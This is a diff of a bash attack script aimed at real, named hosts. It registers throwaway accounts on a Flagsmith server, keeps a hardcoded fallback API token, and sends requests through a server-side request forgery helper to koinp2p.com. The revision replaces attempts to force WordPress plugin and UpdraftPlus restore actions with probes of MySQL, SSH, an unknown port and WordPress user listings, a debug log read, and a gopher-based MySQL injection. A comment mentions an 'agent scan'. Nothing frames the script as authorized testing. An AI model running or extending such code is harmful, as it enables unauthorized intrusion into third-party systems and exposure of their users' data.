@@ -4,18 +4,19 @@ UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Ge
 # Register fresh account
 ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
   -H "Content-Type: application/json" -H "User-Agent: $UA" \
-  -d "{\"email\":\"kw-v22-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
+  -d "{\"email\":\"kw-v23-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
 KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
 echo "Key: $KEY"
 
 if [ -z "$KEY" ]; then
+  # Use latest known working account
   KEY="0cb53dd00f936c2de9e7ba6061bdf7f93e596d2b"
   EKEY="Ldqx3Z27VxYrTFXgWYiZhb"
-  echo "Using fallback"
+  echo "Fallback"
 else
   OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d '{"name":"v22"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+    -d '{"name":"v23"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
   PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
     -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
@@ -31,27 +32,42 @@ SSRF() {
     -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
 }
 
-# Test 1: Force update check via wp-cron with specific args
-echo "=== FORCE UPDATE ==="
-SSRF "https://koinp2p.com/wp-cron.php?doing_wp_cron=1"
+# === TEST 1: MySQL port via HTTP (leak version) ===
+echo "=== MYSQL VIA HTTP ==="
+SSRF "http://koinp2p.com:3306/"
 echo ""
 
-# Test 2: Try to directly trigger core update via admin-ajax
-echo "=== TRIGGER UPDATE ==="
-SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=update-plugin&plugin=hello.php&slug=hello-dolly"
+# === TEST 2: WP REST API (was 200 from agent scan!) ===
+echo "=== WP REST API ==="
+SSRF "http://koinp2p.com/wp-json/"
 echo ""
 
-# Test 3: Check staging after trigger
-echo "=== CHECK STAGING ==="
-SSRF "https://koinp2p.com/wp-content/upgrade/"
+# === TEST 3: WP REST API users (might be public from internal) ===
+echo "=== WP REST USERS ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/users"
 echo ""
 
-# Test 4: NEW — Check if koinp2p.com's wp-content is writable by testing UpdraftPlus dir creation
-echo "=== UPDRAFT DIR CREATE ==="
-SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&action=updraft_restore&backup_timestamp=1&updraft_restore[]=plugins"
+# === TEST 4: WP REST API posts ===
+echo "=== WP REST POSTS ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/posts"
 echo ""
 
-# Test 5: Check if UpdraftPlus created log files (created during restore attempt)
-echo "=== UPDRAFT LOGS ==="
-SSRF "https://koinp2p.com/wp-content/updraft/"
+# === TEST 5: Port 9090 (unknown service) ===
+echo "=== PORT 9090 ==="
+SSRF "http://koinp2p.com:9090/"
+echo ""
+
+# === TEST 6: SSH port (banner) ===
+echo "=== SSH PORT ==="
+SSRF "http://koinp2p.com:22/"
+echo ""
+
+# === TEST 7: Gopher to MySQL (inject MySQL auth) ===
+echo "=== GOPHER MYSQL ==="
+SSRF "gopher://koinp2p.com:3306/_"
+echo ""
+
+# === TEST 8: Use HTTP via internal hostname ===
+echo "=== INTERNAL HTTP ==="
+SSRF "http://koinp2p.com/wp-content/debug.log"
 echo ""
